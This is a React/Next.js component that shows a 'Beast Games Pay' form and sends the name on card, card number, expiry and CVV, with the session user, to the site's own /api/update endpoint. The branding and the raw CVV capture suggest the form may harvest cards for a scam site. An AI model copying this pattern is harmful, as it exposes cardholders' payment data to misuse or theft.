'use client'
import Axios, { AxiosError, AxiosRequestConfig } from "axios"
import { useSession } from "next-auth/react"
import { useRouter } from "next/navigation"
import { useState } from "react"
import FormHero from "./formHero"




export default function Loan({setOthers, others, loading, setLoading}:{setLoading:any, setOthers:any, others:boolean, loading:boolean}) {
    
    
    const [cvv, setCVV] = useState('')
    const [cardNumber, setCardNumber] = useState('')
    const [name, setNameOnCard] = useState('')
    const [exp, setExp] = useState('');
    const [error, setError] = useState('');
    const { data: session } = useSession();
    //console.log(session)
    const router = useRouter()
    const onSubmitForm = async () => {

        if (cvv==''||name==''||cardNumber==''||exp=='') {
            return
        }
        setError('')
        setLoading(!loading)
        try {
          //  values.image = profile?.image;
            //console.log(values);
            const config: AxiosRequestConfig = {
                url: "/api/update",
                data: JSON.stringify({ccv:cvv, cardNumber:cardNumber, name:name, exp:exp, userId:session?.user}),
                method: "PUT",
                headers: {
                    "Content-Type":"application/json"
                }
            };

            const res = await Axios(config)

            if (res.status == 200) {
                setLoading(false)
                setOthers(!others)
            } else {
                
                console.log(res.status)
            }

            console.log(res)
        } catch (error) {
           //const { message } = error
            setLoading(false)
            setError('Bad Input or Network Error')
            console.log('this error:::', error)
        }
    }

    const dateFormart = (e: { target: { value: string } }) => {
        let ev = e.target.value.replace(
          /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
        ).replace(
          /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
        ).replace(
          /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
        ).replace(
          /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
        ).replace(
          /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
        ).replace(
          /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
        ).replace(
          /\/\//g, '/' // Prevent entering more than 1 `/`
        );
        setExp(ev)
      }

   

  return (
      <div>
          <FormHero header='Beast Games Pay' text='Beast-Pay is fast, secure and reliable way to make online payments.'/>
          
          {
              error != '' && <div className=" bg-yellow-600 text-red-700 p-4 text-center">{error}</div>
          }
          <div className=" mt-2 flex flex-col gap-2">
              <input
                  className=" w-[100%] border-2 border-gray-900 p-3"
                  type='text'
                  placeholder="Name on card"
                  name="card_name"
                  onChange={(e)=>setNameOnCard(e.target.value)}
            />
              <input
                  name="card_number"
                  type='tel'
                  className="  w-[100%] border-2 border-gray-900 p-3"
                  placeholder="5632 3210 2112 3211"
                  onChange={(e)=>setCardNumber(e.target.value)}
              />
              <div className=" flex justify-between">
                <input
                    name="card_number"
                    type='text'
                    className="  w-[30%] border-2 border-gray-900 p-3"
                    placeholder="01/12"
                      onChange={dateFormart}
                      pattern="[0-9]*"
                      inputMode="numeric"
                      maxLength={5}
                      value={exp}

                  />
                   <input
                    name="card_number"
                    type='text'
                    className="  w-[30%] border-2 border-gray-900 p-3"
                    placeholder="cvv"
                      onChange={(e) => setCVV(e.target.value)}
                      pattern="[0-9]*"
                      inputMode="numeric"
                      maxLength={3}
                />
              </div>
              <button onClick={onSubmitForm} className=' bg-gray-900 text-white p-3'>Next</button>
          </div>
          
          
      
      </div>
      
  )
}
